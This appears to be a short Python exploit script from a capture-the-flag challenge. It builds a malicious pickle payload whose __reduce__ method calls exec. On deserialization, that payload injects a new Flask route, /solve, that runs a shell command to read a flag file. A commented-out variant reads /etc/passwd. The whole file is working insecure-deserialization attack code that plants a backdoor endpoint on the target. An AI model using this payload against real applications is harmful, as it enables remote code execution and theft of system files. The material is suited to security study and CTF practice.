import base64
import functools
import os
import pickle
import requests
import flask

class UserData:
    def __reduce__(self):
        return exec, ("""global app;
@app.route("/solve", methods=["GET"])
def myroute():
    import subprocess
    return subprocess.check_output(["cat", "/in_awe_at_the_size_of_this_flag_absolute_unit"])""", )
        # return type, ('Log', (object, ), dict(should_ban=functools.partial(
        #     exec,
        #     "import subprocess;email = subprocess.Popen(['cat', '/etc/passwd'], stdout=subprocess.PIPE).stdout.read(1024)"
        # )))